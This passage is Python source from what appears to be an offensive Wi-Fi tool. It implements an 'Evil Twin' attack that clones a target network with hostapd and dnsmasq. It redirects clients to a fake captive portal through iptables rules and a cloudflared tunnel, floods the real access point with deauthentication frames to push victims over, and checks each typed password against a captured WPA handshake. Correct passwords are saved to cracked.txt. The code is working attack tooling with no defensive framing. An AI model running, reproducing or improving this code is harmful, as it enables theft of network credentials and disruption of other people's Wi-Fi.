        ap_name = f"{self.interface}_ap"
        mon_name = f"{self.interface}mon"

        self._mon_interface = None

        # Kill interfering processes
        run_command(["airmon-ng", "check", "kill"])
        time.sleep(1)

        # Remove leftover interfaces
        for old in [ap_name, mon_name, f"{self.interface}_mon"]:
            run_command(["iw", "dev", old, "del"])
        time.sleep(0.3)

        # Check what interfaces exist now
        iw_out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
        existing_ifaces = []
        for line in iw_out.stdout.splitlines():
            if line.strip().startswith("Interface"):
                existing_ifaces.append(line.strip().split()[-1])

        phy = self._get_phy_name()
        # Atheros AR9271 (ath9k_htc) and mac80211 drivers support 1 AP + 1 Monitor interface
        # simultaneously on the same physical chip! We create ap_name and mon_name on the phy.
        if phy:
            # First ensure the base interface is managed and down before adding VIFs
            run_command(["ip", "link", "set", self.interface, "down"])
            
            # 1. Try creating a dedicated AP interface
            ap_res = subprocess.run(
                ["iw", "phy", phy, "interface", "add", ap_name, "type", "ap"],
                capture_output=True, text=True, timeout=5
            )
            if ap_res.returncode == 0:
                self.ap_interface = ap_name
                # 2. Try creating a separate monitor interface for deauth injection
                mon_res = subprocess.run(
                    ["iw", "phy", phy, "interface", "add", mon_name, "type", "monitor"],
                    capture_output=True, text=True, timeout=5
                )
                if mon_res.returncode == 0:
                    run_command(["ip", "link", "set", mon_name, "up"])
                    self._mon_interface = mon_name
                return True

            # If creating a new 'type ap' interface failed, check if we can use the base interface for AP
            # and add a virtual monitor interface (supported by ath9k_htc):
            run_command(["iw", "dev", self.interface, "set", "type", "__ap"])
            mon_res = subprocess.run(
                ["iw", "phy", phy, "interface", "add", mon_name, "type", "monitor"],
                capture_output=True, text=True, timeout=5
            )
            if mon_res.returncode == 0:
                run_command(["ip", "link", "set", mon_name, "up"])
                self._mon_interface = mon_name

        # Fallback to airmon-ng if manual VIF creation was not supported
        if not self._mon_interface:
            subprocess.run(
                ["airmon-ng", "start", self.interface],
                capture_output=True, text=True, timeout=15
            )
            time.sleep(1)

            iw_out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
            existing_ifaces = []
            for line in iw_out.stdout.splitlines():
                if line.strip().startswith("Interface"):
                    existing_ifaces.append(line.strip().split()[-1])

            for iface in existing_ifaces:
                if iface != self.interface and (iface.endswith("mon") or iface.endswith("mon0")):
                    self._mon_interface = iface
                    break

        self.ap_interface = self.interface
        return True

    def _get_phy_name(self):
        """Get the phy name for the interface."""
        # Method 1: from iw dev info
        try:
            result = subprocess.run(
                ["iw", "dev", self.interface, "info"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                if "wiphy" in line.lower():
                    return line.strip().split()[-1]
        except Exception:
            pass

        # Method 2: from sysfs
        try:
            with open(f"/sys/class/net/{self.interface}/phy80211/name") as f:
                return f.read().strip()
        except Exception:
            pass

        # Method 3: from sysfs index
        try:
            with open(f"/sys/class/net/{self.interface}/phy80211/index") as f:
                return f"phy{f.read().strip()}"
        except Exception:
            pass

        return None

    def _setup_ap_interface(self):
        """Configure the AP interface IP and bring it up."""
        if not self.ap_interface:
            return False

        run_command(["ip", "addr", "flush", "dev", self.ap_interface])
        run_command(["ip", "addr", "add", f"{PORTAL_AP_IP}/24", "dev", self.ap_interface])
        run_command(["ip", "link", "set", self.ap_interface, "up"])
        time.sleep(0.5)
        return True

    def _setup_firewall_redirect(self):
        """Transparently DNAT HTTP/HTTPS from AP clients to the portal.

        DNS interception alone (address=/#/) is bypassed when a phone keeps a
        hardcoded/DoH resolver or cached resolvers — its connectivity probe then
        dies without ever reaching us ("connected" but no portal). Redirecting
        ports 80 and 443 makes EVERY attempt from the client land on our portal,
        no matter how the probe hostname got resolved.
        """
        iface = self.ap_interface
        if not iface:
            return
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        except OSError:
            pass

        # Redirect port 80 (HTTP) to local captive portal
        rule_80 = ["iptables", "-t", "nat", "-C", "PREROUTING", "-i", iface,
                   "-p", "tcp", "--dport", "80", "-j", "DNAT",
                   "--to-destination", f"{PORTAL_AP_IP}:80"]
        if subprocess.run(rule_80, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            add_80 = list(rule_80)
            add_80[3] = "-A"
            subprocess.run(add_80, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # For HTTPS (443): Modern devices (Android 14+, One UI 6+, iOS 16+) test HTTPS first.
        # If we intercept 443 with an untrusted self-signed certificate, the phone considers
        # it an active MITM attack, kills the probe, and suppresses the captive portal popup!
        # Instead, we reject 443 with TCP reset (or drop it) so the OS fails fast and
        # IMMEDIATELY falls back to the HTTP (port 80) probe which triggers the portal popup.
        rule_reject_443 = ["iptables", "-C", "FORWARD", "-i", iface,
                           "-p", "tcp", "--dport", "443", "-j", "REJECT",
                           "--reject-with", "tcp-reset"]
        if subprocess.run(rule_reject_443, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            add_rej = list(rule_reject_443)
            add_rej[1] = "-I"
            subprocess.run(add_rej, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        rule_input_rej = ["iptables", "-C", "INPUT", "-i", iface,
                          "-p", "tcp", "--dport", "443", "-j", "REJECT",
                          "--reject-with", "tcp-reset"]
        if subprocess.run(rule_input_rej, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            add_in = list(rule_input_rej)
            add_in[1] = "-I"
            subprocess.run(add_in, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Only when a public HTTPS tunnel is up: let the phone reach the internet
        # path to the tunnel's hostname (its CAPPORT API), nothing else — clients
        # still get intercepted for every other domain via dnsmasq wildcard.
        if self.public_api_url:
            masq = ["iptables", "-t", "nat", "-C", "POSTROUTING",
                    "-s", "10.0.0.0/24", "!", "-d", "10.0.0.0/24",
                    "-j", "MASQUERADE"]
            if subprocess.run(masq, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL).returncode != 0:
                add = list(masq)
                add[3] = "-A"
                subprocess.run(add, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                logger.info("Added MASQUERADE for AP clients (tunnel egress)")
        print(f"{C_GREEN}[+] Firewall redirect: AP client port 80/443 -> portal{C_RESET}")
        logger.info(f"Added PREROUTING DNAT for {iface} to {PORTAL_AP_IP}")

    def _remove_firewall_redirect(self):
        """Remove the PREROUTING DNAT rules added for the AP interface."""
        iface = self.ap_interface
        if not iface:
            return
        subprocess.run(
            ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", iface,
             "-p", "tcp", "--dport", "80", "-j", "DNAT",
             "--to-destination", f"{PORTAL_AP_IP}:80"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.run(
            ["iptables", "-D", "FORWARD", "-i", iface,
             "-p", "tcp", "--dport", "443", "-j", "REJECT",
             "--reject-with", "tcp-reset"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.run(
            ["iptables", "-D", "INPUT", "-i", iface,
             "-p", "tcp", "--dport", "443", "-j", "REJECT",
             "--reject-with", "tcp-reset"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.run(
            ["iptables", "-t", "nat", "-D", "POSTROUTING",
             "-s", "10.0.0.0/24", "!", "-d", "10.0.0.0/24", "-j", "MASQUERADE"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        logger.info("Removed firewall redirect and reject rules")

    def _ensure_cloudflared(self):
        """Return a usable cloudflared path (preflight result or auto-download)."""
        if getattr(self, "_cloudflared_bin", None):
            return self._cloudflared_bin
        for cand in CLOUDFLARED_PATHS:
            if os.path.exists(cand):
                return cand
        which = shutil.which("cloudflared")
        if which:
            return which
        return download_cloudflared()

    def _try_setup_public_tunnel(self):
        """Start a cloudflared quick tunnel → a valid public HTTPS URL.

        Modern HTTPS-first devices (Samsung One UI, Android 12+, iOS) silently
        ignore a plain-http or self-signed CAPPORT API. A quick tunnel — no
        account, no domain, fully automatic — gives us a trusted Certificates
        chain to advertise in DHCP option 114. On any failure we keep the
        classic local http:// portal (older devices still work).
        """
        if self.public_api_url:
            return True
        binary = self._ensure_cloudflared()
        if not binary:
            print(f"{C_YELLOW}[!] cloudflared not available — keeping the local "
                  f"http:// portal (best for older Android/iPhone/firefox). "
                  f"Install once for full HTTPS-first support:\n"
                  f"    sudo wget -O /usr/local/bin/cloudflared "
                  f"https://github.com/cloudflare/cloudflared/releases/latest/download/"
                  f"cloudflared-linux-amd64 && sudo chmod +x /usr/local/bin/cloudflared{C_RESET}")
            return False
        try:
            proc = subprocess.Popen(
                [binary, "tunnel", "--url", f"http://{PORTAL_AP_IP}:80",
                 "--no-autoupdate", "--protocol", "quic"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
        except OSError:
            return False
        self.tunnel_proc = proc

        host = None
        deadline = time.time() + 30
        while time.time() < deadline:
            if proc.poll() is not None:
                break
            try:
                line = proc.stdout.readline()
            except Exception:
                break
            if not line:
                time.sleep(0.2)
                continue
            m = TUNNEL_HOST_PATTERN.search(line)
            if m:
                host = m.group(1)
                break
            if ("error" in line.lower() or "failed" in line.lower()):
                print(f"{C_YELLOW}[tunnel] {line.strip()}{C_RESET}")

        if not host:
            if proc.poll() is not None:
                print(f"{C_YELLOW}[!] cloudflared exited — internet uplink needed "
                      f"on this box for the public portal.{C_RESET}")
            try:
                proc.terminate()
            except OSError:
                pass
            self.tunnel_proc = None
            return False

        self.tunnel_host = host
        self.public_api_url = f"https://{host}"
        return True

    def _verify_public_tunnel(self):
        """Confirm the public CAPPORT endpoint responds; degrade to local on fail."""
        if not self.public_api_url:
            return True
        api = f"{self.public_api_url}/.well-known/captiveportal/api"
        for attempt in range(6):
            try:
                req = urllib.request.Request(api, headers={"User-Agent": "wifinightmare"})
                with urllib.request.urlopen(req, timeout=8) as resp:
                    if resp.status == 200:
                        return True
            except Exception:
                time.sleep(3)
        print(f"{C_YELLOW}[!] Public HTTPS CAPPORT endpoint not reachable — "
              f"falling back to the local http:// portal.{C_RESET}")
        self._disable_public_tunnel()
        return False

    def _disable_public_tunnel(self):
        """Tear down the tunnel and put the local http:// option 114 back."""
        if self.tunnel_proc and self.tunnel_proc.poll() is None:
            try:
                self.tunnel_proc.terminate()
                self.tunnel_proc.wait(timeout=3)
            except Exception:
                try:
                    self.tunnel_proc.kill()
                except Exception:
                    pass
        self.tunnel_proc = None
        if not self.public_api_url:
            return
        was = self.public_api_url
        self.public_api_url = None
        self.tunnel_host = None
        logger.info(f"public tunnel disabled ({was})")
        # Rewrite dnsmasq config back to the local API and restart it.
        try:
            self._write_configs()
            if self.dnsmasq_proc and self.dnsmasq_proc.poll() is None:
                self._start_dnsmasq()
        except Exception as exc:
            logger.debug(f"tunnel degrade rewrite failed: {exc}")

    def _start_hostapd(self):
        """Start hostapd daemon."""
        if not self.ap_interface:
            return False

        try:
            self.hostapd_proc = subprocess.Popen(
                ["hostapd", HOSTAPD_CONF],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(2)

            if self.hostapd_proc.poll() is not None:
                stderr = self.hostapd_proc.stderr.read().decode(errors="ignore")
                print(f"{C_RED}[!] hostapd failed: {stderr.strip()}{C_RESET}")
                logger.error(f"hostapd failed: {stderr}")
                return False

            print(f"{C_GREEN}[+] hostapd started on {self.ap_interface}{C_RESET}")
            logger.info("hostapd started")
            return True

        except FileNotFoundError:
            print(f"{C_RED}[!] hostapd not found. Install: apt-get install hostapd{C_RESET}")
            return False

    def _start_dnsmasq(self):
        """Start dnsmasq for DHCP + DNS."""
        if not self.ap_interface:
            return False

        # Kill any existing dnsmasq
        run_command(["killall", "dnsmasq"])
        time.sleep(0.5)

        self._dns_log = []

        def _pipe_reader():
            while True:
                line = proc.stdout.readline()
                if not line:
                    break
                text = line.decode(errors="replace").rstrip()
                if text:
                    self._dns_log.append(text)
                    print(f"{C_CYAN}[dns] {text}{C_RESET}", flush=True)

        try:
            proc = subprocess.Popen(
                ["dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            self.dnsmasq_proc = proc
            threading.Thread(target=_pipe_reader, args=(), daemon=True).start()
            time.sleep(1)

            if proc.poll() is not None:
                tail = "\n".join(self._dns_log[-3:])
                print(f"{C_RED}[!] dnsmasq failed: {tail.strip() or 'see output above'}{C_RESET}")
                logger.error(f"dnsmasq failed: {tail}")
                return False

            print(f"{C_GREEN}[+] dnsmasq started (DHCP + DNS) port 53{C_RESET}")
            print(f"{C_CYAN}[i] DNS/DHCP logging ON — queries from clients will "
                  f"appear here as [dns] lines{C_RESET}")
            logger.info("dnsmasq started")
            return True

        except FileNotFoundError:
            print(f"{C_RED}[!] dnsmasq not found. Install: apt-get install dnsmasq{C_RESET}")
            return False

    def _start_http_server(self):
        """Start captive portal servers: HTTP (80) + HTTPS (443, self-signed)."""
        servers = []
        threads = []

        # ── Plain HTTP on port 80 ──
        try:
            # ThreadingHTTPServer handles multiple concurrent requests (devices
            # polling /status every second while loading the portal page).
            http = ThreadingHTTPServer((PORTAL_AP_IP, 80), PortalHTTPHandler)
            http.timeout = 5.0  # prevent hanging on dead clients
            t = threading.Thread(target=http.serve_forever, daemon=True)
            t.start()
            servers.append(http)
            threads.append(t)
            print(f"{C_GREEN}[+] Captive portal HTTP  on {PORTAL_AP_IP}:80{C_RESET}")
        except OSError as e:
            print(f"{C_RED}[!] HTTP portal server failed: {e}{C_RESET}")
            logger.error(f"HTTP portal server failed: {e}")
            return False

        # ── HTTPS on port 443 (self-signed) ──
        # iOS/macOS probe captive.apple.com over TLS; recent Android/Chromium
        # (Samsung One UI, ColorOS/Oppo, ChromeOS) probe HTTPS-first too.
        # A self-signed cert gives them a TLS response (cert error = captive
        # portal), whereas a closed port makes them think there is no portal.
        try:
            cert = _generate_self_signed_cert()
            if not cert:
                print(f"{C_YELLOW}[!] openssl not found — HTTPS portal (port 443) disabled.{C_RESET}")
                print(f"{C_YELLOW}    Apple/iOS and some Android devices may not show the portal.{C_RESET}")
                logger.warning("openssl missing; HTTPS captive portal disabled")
            else:
                context = _make_ssl_context(cert)
                https = PortalHTTPSServer((PORTAL_AP_IP, PORTAL_HTTPS_PORT), PortalHTTPHandler, context)
                https.timeout = 5.0
                t = threading.Thread(target=https.serve_forever, daemon=True)
                t.start()
                servers.append(https)
                threads.append(t)
                print(f"{C_GREEN}[+] Captive portal HTTPS on {PORTAL_AP_IP}:{PORTAL_HTTPS_PORT} (self-signed){C_RESET}")
        except OSError as e:
            print(f"{C_YELLOW}[!] HTTPS portal server on port 443 failed: {e}{C_RESET}")
            logger.error(f"HTTPS portal server failed: {e}")
        except Exception as e:
            logger.error(f"HTTPS portal server error: {e}")

        self.http_servers = servers
        self.http_threads = threads
        logger.info("HTTP portal server started")
        return True

    def _sniffer_thread(self):
        """Sniff for clients on the target network."""
        if not self.interface:
            return

        def _sniff_cb(pkt):
            if pkt.haslayer(Dot11):
                addr1 = pkt.addr1.lower() if pkt.addr1 else ""
                addr2 = pkt.addr2.lower() if pkt.addr2 else ""
                client_mac = None
                if self.target_bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                    client_mac = addr2
                elif self.target_bssid == addr2 and addr1 != "ff:ff:ff:ff:ff:ff" and not addr1.startswith("33:33"):
                    client_mac = addr1
                if client_mac and client_mac not in self.clients:
                    self.clients.add(client_mac)

        while not self.stop_attack:
            try:
                sniff(iface=self.interface, prn=_sniff_cb, timeout=1.0, store=0)
            except Exception:
                pass

    @staticmethod
    def _is_monitor_mode(iface):
        """True if the interface is currently in monitor mode."""
        if not iface:
            return False
        try:
            out = subprocess.run(
                ["iw", "dev", iface, "info"],
                capture_output=True, text=True, timeout=5
            )
            for line in out.stdout.splitlines():
                if line.lstrip().lower().startswith("type"):
                    return "monitor" in line.lower()
        except Exception:
            pass
        return False

    @staticmethod
    def _write_mdk_bssid_file(bssid):
        """Write the target BSSID to the blacklist file mdk4/mdk3 -b expects.

        A blacklist *file* is what mdk4/mdk3 deauth mode actually wants; a
        bare "-B <mac>" arg is not a valid targeting option for mode "d", so
        the old command silently attacked nothing.
        """
        try:
            with open(DEAUTH_BSSID_FILE, "w") as f:
                f.write(bssid + "\n")
            return True
        except Exception:
            return False

    def _deauth_thread(self):
        """Deauth clients from the real network."""
        # Deauth requires a monitor-mode interface to inject raw 802.11.
        # Putting the AP-mode interface into monitor after hostapd started
        # would tear the portal down, so if the only candidate IS the AP
        # interface we warn once and stop instead of pretending success.
        tool = None
        for name in ["mdk4", "mdk3", "aireplay-ng"]:
            if shutil.which(name):
                tool = name
                break

        iface = self.interface
        on_ap_iface = iface == self.ap_interface
        monitor_ok = self._is_monitor_mode(iface)

        if not monitor_ok and not on_ap_iface:
            # Best-effort: promote a non-AP interface into monitor mode.
            run_command(["ip", "link", "set", iface, "down"])
            subprocess.run(
                ["iw", "dev", iface, "set", "type", "monitor"],
                capture_output=True, text=True, timeout=5
            )
            run_command(["ip", "link", "set", iface, "up"])
            time.sleep(1)
            monitor_ok = self._is_monitor_mode(iface)
        elif not monitor_ok and on_ap_iface:
            print(f"{C_YELLOW}[!] Deauth can't run: {iface} is the live AP "
                  f"interface and cannot enter monitor mode.{C_RESET}")
            print(f"{C_YELLOW}[i] Add a second adapter (or use hardware Evil "
                  f"Twin) for reliable deauth.{C_RESET}")
            logger.error(f"deauth: {iface} is the AP interface — cannot inject")
            return

        if not monitor_ok:
            print(f"{C_RED}[!] Deauth unavailable: {iface} couldn't be switched "
                  f"to monitor mode.{C_RESET}")
            logger.error(f"deauth: {iface} not usable as monitor interface")
            return

        try:
            run_command(["iw", "dev", iface, "set", "channel", str(self.target_channel)])
        except Exception:
            pass

        mdk_file_ok = False
        if tool in ("mdk4", "mdk3"):
            mdk_file_ok = self._write_mdk_bssid_file(self.target_bssid)

        print(f"{C_GREEN}[+] Deauth: {iface} ({tool or 'scapy'}) "
              f"on ch{self.target_channel}{C_RESET}")

        while not self.stop_attack:
            try:
                clients = list(self.clients)

                if tool == "mdk4" and mdk_file_ok:
                    r = subprocess.run(
                        ["mdk4", iface, "d", "-b", DEAUTH_BSSID_FILE,
                         "-c", str(self.target_channel)],
                        capture_output=True, text=True, timeout=3
                    )
                    if r.returncode != 0:
                        logger.debug(f"mdk4: {r.stderr.strip()[:200]}")
                    self.deauth_sent += 3
                elif tool == "mdk3" and mdk_file_ok:
                    r = subprocess.run(
                        ["mdk3", iface, "d", "-b", DEAUTH_BSSID_FILE,
                         "-c", str(self.target_channel)],
                        capture_output=True, text=True, timeout=3
                    )
                    if r.returncode != 0:
                        logger.debug(f"mdk3: {r.stderr.strip()[:200]}")
                    self.deauth_sent += 1
                elif tool == "aireplay-ng":
                    # One broadcast run + one targeted run per client known to
                    # be associated to the real AP.
                    targets = [None] + clients
                    for client in targets:
                        cmd = ["aireplay-ng", "--deauth", "5", "-a", self.target_bssid]
                        if client:
                            cmd += ["-c", client]
                        cmd += ["--ignore-negative-one", iface]
                        r = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                        if r.returncode != 0:
                            logger.debug(f"aireplay-ng: {r.stderr.strip()[:200]}")
                    self.deauth_sent += len(targets) * 5
                else:
                    # No CLI tool installed: raw scapy injection on monitor.
                    frames = [RadioTap() / Dot11(
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=self.target_bssid,
                        addr3=self.target_bssid
                    ) / Dot11Deauth(reason=7)]
                    frames += [RadioTap() / Dot11(
                        addr1=m, addr2=self.target_bssid,
                        addr3=self.target_bssid
                    ) / Dot11Deauth(reason=7) for m in clients]
                    sendp(frames, iface=iface, count=2, verbose=False)
                    self.deauth_sent += 2

                time.sleep(0.5)
            except Exception as e:
                logger.debug(f"Deauth error: {e}")
                time.sleep(2)

    def _read_leases(self):
        """Yield (mac, ip) tuples from the dnsmasq lease file."""
        try:
            with open(LEASES_FILE) as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 3:
                        yield parts[1], parts[2]
        except OSError:
            return

    def _status_display(self):
        """Show attack status: AP clients, DHCP leases, passwords tried, deauth."""
        last_time = time.time()
        while not self.stop_attack:
            now = time.time()

            # Report every new DHCP lease — proves the phone got an IP from US
            # (associated but no lease = phone is using cached/old network config).
            for mac, ip in self._read_leases():
                key = (mac, ip)
                if key not in self._seen_leases:
                    self._seen_leases.add(key)
                    print(f"\n{C_CYAN}[+] Client joined: {ip} ({mac.upper()}){C_RESET}", flush=True)

            if now - last_time >= 3.0:
                ap_clients = 0
                try:
                    out = subprocess.run(["hostapd_cli", "-p", "/var/run/hostapd", "-i", self.ap_interface, "all_sta"],
                                         capture_output=True, text=True, timeout=2)
                    if out.returncode == 0 and out.stdout:
                        # each station starts with a line containing its MAC (xx:xx:xx:xx:xx:xx)
                        ap_clients = len(re.findall(r"^([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})",
                                                    out.stdout, re.MULTILINE))
                except Exception:
                    pass

                if ap_clients == 0:
                    try:
                        iw_out = subprocess.run(["iw", "dev", self.ap_interface, "station", "dump"],
                                                capture_output=True, text=True, timeout=2)
                        if iw_out.returncode == 0:
                            ap_clients = iw_out.stdout.count("Station ")
                    except Exception:
                        pass

                # If layer-2 station query is empty but we have active DHCP leases, show leases count
                if ap_clients == 0 and self._seen_leases:
                    ap_clients = len(self._seen_leases)

                deauth_status = f"Deauth:{self.deauth_sent}"
                tried = len(self._passwords_tried)

                sys.stdout.write("\r\033[K")
                line = f"{C_GREEN}AP clients: {ap_clients}{C_RESET} | "
                line += f"{C_YELLOW}Leased: {len(self._seen_leases)}{C_RESET} | "
                line += f"{C_YELLOW}Tried: {tried}{C_RESET} | "
                line += f"{C_RED}{deauth_status}{C_RESET}"
                sys.stdout.write(line)
                sys.stdout.flush()
                last_time = now
            time.sleep(0.5)

    def _cleanup(self):
        """Kill all started processes and remove interfaces."""
        self.stop_attack = True

        self._remove_firewall_redirect()

        if self.tunnel_proc and self.tunnel_proc.poll() is None:
            try:
                self.tunnel_proc.terminate()
                self.tunnel_proc.wait(timeout=3)
            except Exception:
                try:
                    self.tunnel_proc.kill()
                except Exception:
                    pass
        self.tunnel_proc = None

        # Stop portal servers (HTTP + HTTPS)
        for srv in self.http_servers:
            try:
                srv.shutdown()
                srv.server_close()
            except Exception:
                pass
        for t in self.http_threads:
            try:
                if t.is_alive():
                    t.join(timeout=2)
            except Exception:
                pass

        # Kill hostapd
        if self.hostapd_proc and self.hostapd_proc.poll() is None:
            try:
                self.hostapd_proc.terminate()
                self.hostapd_proc.wait(timeout=3)
            except Exception:
                try:
                    self.hostapd_proc.kill()
                except Exception:
                    pass

        # Kill dnsmasq
        if self.dnsmasq_proc and self.dnsmasq_proc.poll() is None:
            try:
                self.dnsmasq_proc.terminate()
                self.dnsmasq_proc.wait(timeout=3)
            except Exception:
                try:
                    self.dnsmasq_proc.kill()
                except Exception:
                    pass

        # Remove AP / Monitor virtual interfaces we created
        if self.ap_interface and self.ap_interface != self.original_interface:
            run_command(["iw", "dev", self.ap_interface, "del"])
        if self._mon_interface and self._mon_interface != self.original_interface:
            run_command(["iw", "dev", self._mon_interface, "del"])
        self.ap_interface = None
        self._mon_interface = None

        # Clean config files
        for f in [HOSTAPD_CONF, DNSMASQ_CONF, PORTAL_HTML_FILE, CERT_FILE, KEY_FILE]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except Exception:
                    pass
        if os.path.isdir(CERTS_DIR):
            try:
                os.rmdir(CERTS_DIR)
            except Exception:
                pass

        # Join threads
        for t in [self.deauth_thread, self.status_thread]:
            if t and t.is_alive():
                t.join(timeout=2)

        logger.info("Software Evil Twin cleaned up")

    def run(self):
        """Main attack loop."""
        # Check handshake
        info = self.db.get_info(self.target_bssid)
        has_handshake = (info and info.get('Handshake')
                         and info.get('HSFile')
                         and os.path.exists(info['HSFile']))

        if not has_handshake:
            print(f"{C_RED}[!] No handshake for {self.target_ssid}{C_RESET}")
            input("Press Enter...")
            return

        handshake_file = info['HSFile']

        # Create AP interface
        if not self._create_ap_interface():
            print(f"{C_RED}[!] Could not create AP interface{C_RESET}")
            input("Press Enter...")
            return

        try:
            # Public HTTPS CAPPORT tunnel — automatic, no user input. Gives
            # modern HTTPS-first phones (Samsung/One UI, Android 12+, iOS) a
            # trusted CAPPORT API to advertise via DHCP option 114.
            if self._try_setup_public_tunnel():
                print(f"{C_GREEN}[+] Public HTTPS captive API: "
                      f"{self.public_api_url}/.well-known/captiveportal/api{C_RESET}")

            self._write_configs()

            if not self._setup_ap_interface():
                return

            self._setup_firewall_redirect()

            if not self._start_hostapd():
                return

            if not self._start_dnsmasq():
                return

            if not self._start_http_server():
                return

            # Confirm the public API is actually served (cloudflare edge ready);
            # if not, degrade back to the local http:// portal automatically.
            self._verify_public_tunnel()

            # Set up deauth
            if self._mon_interface:
                # Separate monitor interface exists (e.g. wlan0mon)
                self.interface = self._mon_interface
                run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
            elif self.ap_interface != self.original_interface:
                # AP is on a different interface, switch original to monitor
                run_command(["ip", "link", "set", self.original_interface, "down"])
                time.sleep(0.3)
                subprocess.run(
                    ["iw", "dev", self.original_interface, "set", "type", "monitor"],
                    capture_output=True, text=True, timeout=5
                )
                run_command(["ip", "link", "set", self.original_interface, "up"])
                time.sleep(1)
                self.interface = self.original_interface
                run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
            else:
                # Same interface for AP and deauth — try to add a monitor iface from AP
                mon_name = f"{self.ap_interface}_mon"
                result = subprocess.run(
                    ["iw", "phy", self._get_phy_name() or "phy0", "interface", "add", mon_name, "type", "monitor"],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0:
                    run_command(["ip", "link", "set", mon_name, "up"])
                    time.sleep(0.5)
                    self.interface = mon_name
                    run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
                else:
                    # No VIF support — use the same interface for deauth
                    # Some drivers allow raw frames even in managed/AP mode
                    self.interface = self.ap_interface
                    run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
                    print(f"{C_YELLOW}[!] No monitor interface could be created — "
                          f"deauth on the shared AP interface may not work.{C_RESET}")
                    print(f"{C_YELLOW}[i] A second adapter is recommended for "
                          f"reliable deauth.{C_RESET}")
                    print(f"{C_YELLOW}[i] Without deauth the victim stays on the real AP — "
                          f"connect the target device to '{self.target_ssid}' manually, "
                          f"and watch 'AP clients' (0 = phone hasn't joined).{C_RESET}")

            # Start threads
            self.deauth_thread = threading.Thread(target=self._deauth_thread, daemon=True)
            self.deauth_thread.start()

            monitor_t = threading.Thread(target=self._sniffer_thread, daemon=True)
            monitor_t.start()

            self.status_thread = threading.Thread(target=self._status_display, daemon=True)
            self.status_thread.start()

            print(f"\n{C_GREEN}[+] Evil Twin: {self.target_ssid} on ch{self.target_channel}{C_RESET}")
            print(f"    Portal: http://{PORTAL_AP_IP}  |  https://{PORTAL_AP_IP}  |  Ctrl+C to stop")
            if self.public_api_url:
                print(f"    Public API (trusted HTTPS, advertised via DHCP-114): "
                      f"{self.public_api_url}/.well-known/captiveportal/api")
            print("")
            print(f"{C_YELLOW}[i] Tip: devices that connected to this SSID before may cache "
                  f"\"sign-in dismissed\" and skip the portal. Either FORGET the "
                  f"network on the phone, or rename the SSID for a fresh test. "
                  f"On Samsung/iPhones also disable Mobile data during the test.{C_RESET}")

            # Step 11: Wait for password
            while not self.stop_attack:
                if PortalHTTPHandler.captured_password:
                    # Preserve the password EXACTLY as typed — a WPA passphrase
                    # may legitimately start or end with spaces. Only drop CR/LF
                    # residue a misbehaving client could append.
                    raw_pass = PortalHTTPHandler.captured_password.rstrip("\r\n")
                    PortalHTTPHandler.captured_password = None

                    sys.stdout.write("\r\033[K")
                    self._passwords_tried.append(raw_pass)

                    if len(raw_pass) < 8:
                        print(f"{C_RED}[-] Too short: '{raw_pass}'{C_RESET}")
                        PortalHTTPHandler.verification_status = 3
                        time.sleep(2)
                        PortalHTTPHandler.verification_status = 0
                        continue

                    if len(raw_pass) > 63:
                        print(f"{C_RED}[-] Too long: '{raw_pass}'{C_RESET}")
                        PortalHTTPHandler.verification_status = 3
                        time.sleep(2)
                        PortalHTTPHandler.verification_status = 0
                        continue

                    result = verify_password(handshake_file, self.target_bssid, self.target_ssid, raw_pass)
                    if result is True:
                        print(f"\n{C_GREEN}[+] PASSWORD: {raw_pass}{C_RESET}")
                        self.correct_password = raw_pass
                        PortalHTTPHandler.verification_status = 2

                        with open("cracked.txt", "a") as f:
                            ts = time.strftime("%Y-%m-%d %H:%M:%S")
                            f.write(f"[{ts}] SSID: {self.target_ssid} | MAC: {mask_bssid(self.target_bssid)} | Password: {raw_pass}\n")

                        time.sleep(3)
                        break
                    elif result is False:
                        print(f"{C_RED}[-] Wrong: '{raw_pass}'{C_RESET}")
                        PortalHTTPHandler.verification_status = 3
                        time.sleep(2)
                        PortalHTTPHandler.verification_status = 0
                    else:
                        # None: no usable handshake in the capture. Don't tell
                        # the victim's password is wrong — tell the operator to
                        # re-capture a clean handshake.
                        print(f"{C_RED}[!] No usable handshake in the capture — cannot verify '{raw_pass}'.{C_RESET}")
                        print(f"{C_YELLOW}    Re-capture the handshake first, then run the attack again.{C_RESET}")
                        PortalHTTPHandler.verification_status = 3
                        time.sleep(2)
                        PortalHTTPHandler.verification_status = 0

                time.sleep(0.1)

